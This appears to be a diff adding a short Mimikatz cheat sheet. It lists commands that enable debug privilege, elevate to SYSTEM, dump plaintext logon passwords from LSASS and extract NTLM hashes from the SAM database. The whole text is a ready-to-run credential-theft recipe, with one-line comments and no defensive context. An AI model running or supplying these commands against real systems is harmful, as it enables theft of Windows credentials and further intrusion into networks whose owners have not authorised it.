@@ -1,1 +1,12 @@
+# Check the SeDebugPriv and use it:
+privilege::debug
+
+# To use LSASS need to elevate to System:
+token::elevate
+
+# Extract all passwords possible:
+sekurlsa::logonpasswords
+
+# Extract only NTLM hashes from SAM:
+lsadump::sam
 
